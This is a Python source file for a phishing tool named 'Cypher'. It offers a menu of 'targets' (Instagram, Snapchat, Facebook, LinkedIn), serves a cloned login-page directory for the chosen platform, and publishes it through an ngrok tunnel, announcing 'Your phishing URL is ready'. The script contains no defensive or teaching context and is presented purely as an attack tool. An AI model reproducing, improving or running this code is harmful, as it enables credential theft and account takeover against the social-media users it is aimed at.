from pyfiglet import Figlet
from termcolor import colored
import colorama
import random
import os
import http.server
import socketserver
import subprocess
import webbrowser
import time
import requests
import json
import re
import threading

# Initialize colorama for Windows
colorama.init()

def generate_link(platform):
    print("\nChoose link generation method:")
    print("[1] Ngrok")
    choice = input("Enter your choice: ").strip()
    
    if choice != '1':
        print("Invalid choice!")
        return None
        
    # Check and install ngrok if needed
    print("\nChecking ngrok installation...")
    try:
        subprocess.run(['ngrok', '--version'], capture_output=True, check=True)
        print("✓ Ngrok is already installed")
    except (subprocess.CalledProcessError, FileNotFoundError):
        print("× Ngrok not found. Installing...")
        try:
            os.system('curl -s https://ngrok-agent.s3.amazonaws.com/ngrok.asc | sudo tee /etc/apt/trusted.gpg.d/ngrok.asc >/dev/null')
            os.system('echo "deb https://ngrok-agent.s3.amazonaws.com buster main" | sudo tee /etc/apt/sources.list.d/ngrok.list')
            os.system('sudo apt update')
            os.system('sudo apt install ngrok -y')
            print("✓ Ngrok installed successfully")
        except Exception as e:
            print(f"× Error installing ngrok: {str(e)}")
            return None
            
    # Setup ngrok authentication
    try:
        requests.get("http://localhost:4040/api/tunnels")
    except:
        print("\nNgrok auth token not configured")
        print("Please get your auth token from: https://dashboard.ngrok.com/get-started/your-authtoken")
        token = input("Enter your ngrok auth token: ").strip()
        
        if token:
            try:
                result = subprocess.run(['ngrok', 'config', 'add-authtoken', token], 
                                     capture_output=True, text=True)
                if result.returncode != 0:
                    print(f"× Error configuring auth token: {result.stderr}")
                    return None
            except Exception as e:
                print(f"× Error configuring auth token: {str(e)}")
                return None
        else:
            print("× No token provided")
            return None
    
    return serve_website(platform)

def serve_website(platform):
    # Get the absolute path to the web directory
    current_dir = os.path.dirname(os.path.abspath(__file__))
    
    # Define the directory to serve based on platform
    if platform.lower() == 'instagram':
        directory = os.path.join(current_dir, 'web', 'instagram')
    elif platform.lower() == 'snapchat':
        directory = os.path.join(current_dir, 'web', 'snapchat')
    elif platform.lower() == 'facebook':
        directory = os.path.join(current_dir, 'web', 'facebook')
    elif platform.lower() == 'linkedin':
        directory = os.path.join(current_dir, 'web', 'linkedin')
    else:
        print("Invalid platform selected")
        return None

    # Change to the platform directory
    os.chdir(directory)
    
    try:
        # Start a simple HTTP server in the background
        PORT = random.randint(8000,9000)  # Random port to avoid conflicts
        
        class CustomHandler(http.server.SimpleHTTPRequestHandler):
            def __init__(self, *args, **kwargs):
                super().__init__(*args, directory=directory, **kwargs)
            
            def log_message(self, format, *args):
                # Suppress log messages
                pass
                
            def do_GET(self):
                # Serve index.html for root path
                if self.path == '/':
                    self.path = '/index.html'
                return http.server.SimpleHTTPRequestHandler.do_GET(self)
        
        try:
            httpd = socketserver.TCPServer(("", PORT), CustomHandler)
            print(f"\n✓ Local server started on port {PORT}")
        except OSError as e:
            print(f"× Port {PORT} is in use, trying another port...")
            PORT = random.randint(9001,10000)
            httpd = socketserver.TCPServer(("", PORT), CustomHandler)
            print(f"✓ Local server started on port {PORT}")
        
        # Start the server in a separate process
        server_thread = threading.Thread(target=httpd.serve_forever)
        server_thread.daemon = True
        server_thread.start()
        
        # Kill any existing ngrok processes
        if os.name == 'nt':  # Windows
            os.system('taskkill /f /im ngrok.exe 2>nul')
        else:  # Linux/Mac
            os.system('pkill ngrok')
        
        time.sleep(1)
        
        # Start ngrok in background
        if os.name == 'nt':  # Windows
            subprocess.Popen(f"ngrok http {PORT}", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        else:  # Linux/Mac
            subprocess.Popen(['ngrok', 'http', str(PORT)], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        time.sleep(2)  # Give ngrok time to start
        
        # Get the public URL from ngrok API
        try:
            response = requests.get("http://localhost:4040/api/tunnels")
            tunnels = response.json()['tunnels']
            if tunnels:
                url = tunnels[0]['public_url']
                if not url.startswith('https'):
                    url = url.replace('http', 'https')
                print("\n" + "=" * 60)
                print(colored("Your phishing URL is ready:", 'yellow'))
                print(colored(url, 'green', attrs=['bold']))
                print(colored("Press Ctrl+C to stop", 'red'))
                print("=" * 60 + "\n")
                
                # Keep running until Ctrl+C
                try:
                    while True:
                        time.sleep(1)
                except KeyboardInterrupt:
                    print("\n\nStopping server...")
                    httpd.shutdown()
                    httpd.server_close()
                    if os.name == 'nt':
                        os.system('taskkill /f /im ngrok.exe 2>nul')
                    else:
                        os.system('pkill ngrok')
                    os.chdir(current_dir)  # Return to original directory
                    return None
                    
            else:
                print("× Error: No ngrok tunnels found")
                httpd.shutdown()
                httpd.server_close()
                os.chdir(current_dir)
                return None
                
        except Exception as e:
            print(f"× Error getting ngrok URL: {str(e)}")
            httpd.shutdown()
            httpd.server_close()
            os.chdir(current_dir)
            return None
            
    except Exception as e:
        print(f"\n× Error: {str(e)}")
        print("\nTroubleshooting steps:")
        print("1. Make sure your auth token is correct")
        print("2. Check your internet connection")
        print("3. Make sure no other ngrok instances are running")
        print("4. Try running with sudo: sudo python3 main.py")
        os.chdir(current_dir)
        return None

def print_menu():
    # Create a Figlet object with a different font style
    figlet = Figlet(font='slant')
    
    # Text to display
    text = "Cypher"
    
    # Generate the ASCII art
    ascii_art = figlet.renderText(text)
    
    # Colors for rainbow effect
    colors = ['red', 'yellow', 'green', 'cyan', 'blue', 'magenta']
    
    # Get the width and height of the ASCII art
    ascii_lines = ascii_art.split('\n')
    max_width = max(len(line) for line in ascii_lines)
    height = len(ascii_lines)
    
    # Create decorative frame with proper width
    frame_width = max_width + 8
    frame_width = frame_width + (frame_width % 2)  # Make sure width is even
    top_border = colored('╔' + '═' * (frame_width-2) + '╗', 'cyan')
    bottom_border = colored('╚' + '═' * (frame_width-2) + '╝', 'cyan')
    empty_line = colored('║' + ' ' * (frame_width-2) + '║', 'cyan')
    
    # Create decorative top and bottom bars with proper width
    top_decoration = '█' + '▀' * (frame_width-4) + '█'
    bottom_decoration = '█' + '▄' * (frame_width-4) + '█'
    
    # Build the final output with background
    final_art = [
        top_border,
        colored('║' + top_decoration + '║', 'cyan'),
        empty_line
    ]
    
    # Add the rainbow text with centered alignment
    color_index = 0
    for line in ascii_lines:
        if line.strip():
            padding = (frame_width - 2 - len(line)) // 2
            colored_line = colored(line, colors[color_index % len(colors)])
            right_padding = frame_width - 2 - padding - len(line)
            final_line = colored('║', 'cyan') + ' ' * padding + colored_line + ' ' * right_padding + colored('║', 'cyan')
            final_art.append(final_line)
            color_index += 1
        else:
            final_art.append(empty_line)
    
    # Add menu options
    menu_options = [
        "[ Select your target ]",
        "",
        "[1] Instagram",
        "[2] Snapchat",
        "[3] Facebook",
        "[4] LinkedIn",
        "[5] Exit",
        "",
        "Enter your choice: "
    ]
    
    # Add menu options with proper centering
    for option in menu_options[:-1]:
        padding = (frame_width - 2 - len(option)) // 2
        final_line = colored('║', 'cyan') + ' ' * padding + colored(option, 'white') + ' ' * (frame_width - 2 - padding - len(option)) + colored('║', 'cyan')
        final_art.append(final_line)
    
    final_art.extend([
        empty_line,
        colored('║' + bottom_decoration + '║', 'cyan'),
        bottom_border
    ])
    
    # Add matrix-style side decorations
    side_dec_left = [
        colored('░▒▓█', 'green') + ' ',
        colored('▓▒░█', 'green') + ' ',
        colored('░▒▓█', 'green') + ' '
    ]
    
    side_dec_right = [
        ' ' + colored('█▓▒░', 'green'),
        ' ' + colored('█░▒▓', 'green'),
        ' ' + colored('█▓▒░', 'green')
    ]
    
    # Print the final composition with side decorations
    for i, line in enumerate(final_art):
        if i > 0 and i < len(final_art) - 1:
            left_dec = side_dec_left[i % len(side_dec_left)]
            right_dec = side_dec_right[i % len(side_dec_right)]
            print(left_dec + line + right_dec)
        else:
            print(line)
    
    # Add bottom matrix rain effect
    matrix_bottom = ''.join(colored('▀▄'[(i+random.randint(0,1))%2], 'green') for i in range(frame_width))
    print(' ' * 4 + matrix_bottom)
    
    return input(colored(menu_options[-1], 'white'))

def main():
    while True:
        choice = print_menu()
        if choice == '1':
            generate_link('instagram')
        elif choice == '2':
            generate_link('snapchat')
        elif choice == '3':
            generate_link('facebook')
        elif choice == '4':
            generate_link('linkedin')
        elif choice == '5':
            print("\nExiting...")
            # Kill any running ngrok process
            if os.name == 'nt':
                os.system('taskkill /f /im ngrok.exe 2>nul')
            else:
                os.system('pkill ngrok')
            break
        else:
            print("\nInvalid choice! Press Enter to continue...")
            input()
        
        # Clear screen for Windows
        os.system('cls' if os.name == 'nt' else 'clear')

if __name__ == "__main__":
    main() 